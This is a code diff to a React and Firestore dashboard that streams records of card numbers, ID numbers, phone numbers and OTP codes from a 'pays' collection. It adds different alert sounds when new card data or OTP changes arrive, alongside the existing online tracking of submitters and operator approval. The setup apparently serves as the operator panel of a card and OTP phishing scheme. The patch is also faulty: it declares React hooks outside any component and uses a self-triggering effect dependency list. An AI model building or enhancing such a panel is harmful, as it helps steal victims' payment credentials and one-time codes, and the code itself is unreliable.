@@ -242,12 +242,35 @@ function useOnlineUsersCount() {
   return count
 }
 
-// Function to play notification sound
-function playNotificationSound() {
+// Add this after the existing state declarations (around line 200)
+const [previousNotificationCount, setPreviousNotificationCount] = useState(0)
+const [previousCardCount, setPreviousCardCount] = useState(0)
+const [previousOnlineCount, setPreviousOnlineCount] = useState(0)
+
+// Replace the existing playNotificationSound function
+function playNotificationSound(type: "new" | "card" | "online" | "update" = "new") {
   try {
-    const audio = new Audio("/notification-sound.mp3")
+    let audioFile = "/notification-sound.mp3"
+
+    // Use different sounds for different types of notifications
+    switch (type) {
+      case "card":
+        audioFile = "/card-notification.mp3" // You can add this file or use the same
+        break
+      case "online":
+        audioFile = "/online-notification.mp3" // You can add this file or use the same
+        break
+      case "update":
+        audioFile = "/update-notification.mp3" // You can add this file or use the same
+        break
+      default:
+        audioFile = "/notification-sound.mp3"
+    }
+
+    const audio = new Audio(audioFile)
+    audio.volume = 0.7 // Set volume to 70%
     audio.play().catch((error) => {
-      console.error("Error playing notification sound:", error)
+      console.error(`Error playing ${type} notification sound:`, error)
     })
   } catch (error) {
     console.error("Error creating audio element:", error)
@@ -388,64 +411,111 @@ export default function NotificationsPage() {
     setCardSubmissions(cardCount)
   }
 
-  // Fetch notifications from Firestore
+  // Replace the existing useEffect for fetching notifications (around line 280)
   useEffect(() => {
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
-    const unsubscribe = onSnapshot(
-      q,
-      (querySnapshot) => {
-        const notificationsData = querySnapshot.docs
-          .map((doc) => {
-            const data = doc.data() as any
-            return { id: doc.id, ...data }
-          })
-          .filter((notification: any) => !notification.isHidden) as Notification[]
+    let unsubscribe: () => void
 
-        // Check if there are any new notifications with card info or general info
-        if (notifications.length > 0) {
-          const hasNewCardInfo = notificationsData.some(
-            (notification) =>
-              notification.cardData?.cardNumber &&
-              !notifications.some((n) => n.id === notification.id && n.cardData?.cardNumber),
-          )
-          const hasNewGeneralInfo = notificationsData.some(
-            (notification) =>
-              (notification.idNumber || notification.mobile) &&
-              !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile)),
-          )
+    const fetchData = async () => {
+      const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+      unsubscribe = onSnapshot(
+        q,
+        (querySnapshot) => {
+          const notificationsData = querySnapshot.docs
+            .map((doc) => {
+              const data = doc.data() as any
+              return { id: doc.id, ...data }
+            })
+            .filter((notification: any) => !notification.isHidden) as Notification[]
 
-          // Only play notification sound if new card info or general info is added
-          if (hasNewCardInfo || hasNewGeneralInfo) {
-            playNotificationSound()
+          // Calculate current counts
+          const currentNotificationCount = notificationsData.length
+          const currentCardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
+          const currentOnlineCount = Object.values(onlineStatuses).filter(Boolean).length
+
+          // Check for different types of updates and play appropriate sounds
+          if (notifications.length > 0) {
+            // New notification added
+            if (currentNotificationCount > previousNotificationCount) {
+              playNotificationSound("new")
+            }
+
+            // New card information added
+            if (currentCardCount > previousCardCount) {
+              playNotificationSound("card")
+            }
+
+            // Check for new card info or general info updates
+            const hasNewCardInfo = notificationsData.some(
+              (notification) =>
+                notification.cardData?.cardNumber &&
+                !notifications.some((n) => n.id === notification.id && n.cardData?.cardNumber),
+            )
+
+            const hasNewGeneralInfo = notificationsData.some(
+              (notification) =>
+                (notification.idNumber || notification.mobile) &&
+                !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile)),
+            )
+
+            // Check for status updates
+            const hasStatusUpdate = notificationsData.some((notification) =>
+              notifications.some((n) => n.id === notification.id && n.status !== notification.status),
+            )
+
+            // Check for OTP updates
+            const hasOtpUpdate = notificationsData.some(
+              (notification) =>
+                notification.otp && notifications.some((n) => n.id === notification.id && n.otp !== notification.otp),
+            )
+
+            // Play sounds for different types of updates
+            if (hasNewCardInfo) {
+              playNotificationSound("card")
+            } else if (hasNewGeneralInfo) {
+              playNotificationSound("new")
+            } else if (hasStatusUpdate || hasOtpUpdate) {
+              playNotificationSound("update")
+            }
           }
-        }
 
-        // Update statistics
-        updateStatistics(notificationsData)
+          // Update previous counts
+          setPreviousNotificationCount(currentNotificationCount)
+          setPreviousCardCount(currentCardCount)
+          setPreviousOnlineCount(currentOnlineCount)
 
-        // Update online statuses
-        const newOnlineStatuses: Record<string, boolean> = {}
-        notificationsData.forEach((notification) => {
-          const lastSeenTime = new Date(notification.lastSeen).getTime()
-          const fiveMinutesAgo = Date.now() - 5 * 60 * 1000 // 5 minutes in milliseconds
-          newOnlineStatuses[notification.id] = lastSeenTime > fiveMinutesAgo
-        })
-        setOnlineStatuses(newOnlineStatuses)
+          // Update statistics
+          updateStatistics(notificationsData)
 
-        setNotifications(notificationsData)
-        setIsLoading(false)
+          // Update online statuses
+          const newOnlineStatuses: Record<string, boolean> = {}
+          notificationsData.forEach((notification) => {
+            const lastSeenTime = new Date(notification.lastSeen).getTime()
+            const fiveMinutesAgo = Date.now() - 5 * 60 * 1000 // 5 minutes in milliseconds
+            newOnlineStatuses[notification.id] = lastSeenTime > fiveMinutesAgo
+          })
+          setOnlineStatuses(newOnlineStatuses)
 
-        // Reset to first page when data changes significantly
-        setCurrentPage(1)
-      },
-      (error) => {
-        console.error("Error fetching notifications:", error)
-        setIsLoading(false)
-      },
-    )
+          setNotifications(notificationsData)
+          setIsLoading(false)
 
-    return () => unsubscribe()
-  }, [])
+          // Reset to first page when data changes significantly
+          setCurrentPage(1)
+        },
+        (error) => {
+          console.error("Error fetching notifications:", error)
+          setIsLoading(false)
+        },
+      )
+    }
+
+    fetchData()
+
+    return () => {
+      if (unsubscribe) {
+        unsubscribe()
+      }
+    }
+  }, [notifications, previousNotificationCount, previousCardCount, onlineStatuses])
 
   // Filter notifications based on the selected filter type
   const filteredNotifications = useMemo(() => {
@@ -506,11 +576,16 @@ export default function NotificationsPage() {
     }
   }
 
+  // Update the handleApproval function (around line 380)
   const handleApproval = async (state: string, id: string) => {
     try {
       const notificationRef = doc(db, "pays", id)
       await updateDoc(notificationRef, { status: state })
       setNotifications(notifications.map((n) => (n.id === id ? { ...n, status: state } : n)))
+
+      // Play sound for approval/rejection
+      playNotificationSound("update")
+
       setMessage(true)
       setTimeout(() => {
         setMessage(false)
@@ -538,7 +613,7 @@ export default function NotificationsPage() {
     setSelectedNotification(null)
   }
 
-  // Handle flag color change
+  // Update the handleFlagColorChange function (around line 400)
   const handleFlagColorChange = async (id: string, color: FlagColor) => {
     try {
       // Update in Firestore
@@ -551,6 +626,9 @@ export default function NotificationsPage() {
           notification.id === id ? { ...notification, flagColor: color } : notification,
         ),
       )
+
+      // Play sound for flag update
+      playNotificationSound("update")
     } catch (error) {
       console.error("Error updating flag color:", error)
     }
